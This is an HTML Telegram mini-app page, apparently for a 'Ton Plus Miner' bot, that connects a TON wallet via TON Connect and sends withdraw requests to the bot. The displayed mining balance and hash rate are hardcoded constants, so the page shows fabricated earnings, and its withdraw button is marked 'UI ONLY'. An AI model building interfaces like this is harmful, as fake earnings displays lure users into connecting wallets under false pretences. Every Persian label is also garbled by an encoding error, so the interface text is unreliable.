<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <title>Ton Plus Miner</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Telegram WebApp -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <!-- TON Connect -->
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>

    <style>
        body {
            font-family: sans-serif;
            background: #0e0e0e;
            color: #fff;
            padding: 15px;
        }
        button {
            width: 100%;
            padding: 12px;
            margin-top: 10px;
            border-radius: 8px;
            border: none;
            font-size: 16px;
            cursor: pointer;
        }
        #connectBtn {
            background: #0098ea;
            color: #fff;
        }
        .card {
            background: #1c1c1c;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 10px;
        }
        .success { color: #4caf50; }
        .warning { color: #ffc107; }
    </style>
</head>

<body>

    <h2>â› Ton Plus Miner</h2>

    <div class="card">
        <p>ğŸ’° Ù…ÙˆØ¬ÙˆØ¯ÛŒ: <span id="balance">12.86</span> TON</p>
        <p>âš¡ Ù‚Ø¯Ø±Øª Ø§Ø³ØªØ®Ø±Ø§Ø¬: <span id="hash">12.4</span> H/s</p>
        <p>ğŸ•’ Ø²Ù…Ø§Ù†: <span id="time"></span></p>
    </div>

    <div class="card">
        <button id="connectBtn">ğŸ”— Ø§ØªØµØ§Ù„ Ø¨Ù‡ Ú©ÛŒÙ Ù¾ÙˆÙ„</button>
        <p id="walletBox" style="display:none;">
            ğŸ“¥ Ø¢Ø¯Ø±Ø³ Ø´Ù…Ø§:
            <br>
            <span id="walletAddress" class="success"></span>
        </p>
    </div>

    <div class="card">
        <button onclick="withdraw()">ğŸ’¸ Ø¨Ø±Ø¯Ø§Ø´Øª</button>
    </div>

<script>
/* ================= TELEGRAM INIT ================= */
const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

const user = tg.initDataUnsafe?.user;
if (!user) {
    alert("Ù„Ø·ÙØ§Ù‹ ÙÙ‚Ø· Ø¯Ø§Ø®Ù„ ØªÙ„Ú¯Ø±Ø§Ù… Ø§Ø¬Ø±Ø§ Ø´ÙˆØ¯");
}

/* ================= USER DATA ================= */
let userData = {
    balance: 12.86,
    wallet: null
};

/* ================= CLOCK ================= */
setInterval(() => {
    document.getElementById('time').innerText =
        new Date().toLocaleTimeString('fa-IR');
}, 1000);

/* ================= TON CONNECT ================= */
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://nimwmesfandiari.github.io/ton-plus-bot/tonconnect-manifest.json',
    buttonRootId: 'connectBtn'
});

tonConnectUI.onStatusChange(wallet => {
    if (wallet) {
        const address = wallet.account.address;
        userData.wallet = address;

        document.getElementById('walletAddress').innerText = address;
        document.getElementById('walletBox').style.display = 'block';

        notify("âœ… Ú©ÛŒÙ Ù¾ÙˆÙ„ TON Ù…ØªØµÙ„ Ø´Ø¯");
        saveLocal();
    }
});

/* ================= WITHDRAW (UI ONLY) ================= */
function withdraw() {
    if (!userData.wallet) {
        notify("âŒ Ø§Ø¨ØªØ¯Ø§ Ú©ÛŒÙ Ù¾ÙˆÙ„ Ø±Ø§ Ù…ØªØµÙ„ Ú©Ù†ÛŒØ¯");
        return;
    }

    notify("ğŸ“¤ Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø¨Ø±Ø¯Ø§Ø´Øª Ø«Ø¨Øª Ø´Ø¯");

    sendToBot({
        action: "withdraw",
        user_id: user.id,
        wallet: userData.wallet,
        balance: userData.balance
    });
}

/* ================= STORAGE ================= */
function saveLocal() {
    localStorage.setItem("ton_plus_user", JSON.stringify(userData));
}

const saved = localStorage.getItem("ton_plus_user");
if (saved) {
    userData = JSON.parse(saved);
    if (userData.wallet) {
        document.getElementById('walletAddress').innerText = userData.wallet;
        document.getElementById('walletBox').style.display = 'block';
    }
}

/* ================= BOT SAFE COMM ================= */
function sendToBot(data) {
    if (window.Telegram?.WebApp) {
        Telegram.WebApp.sendData(JSON.stringify(data));
    }
}

/* ================= NOTIFY ================= */
function notify(msg) {
    alert(msg);
}
</script>

</body>
</html>
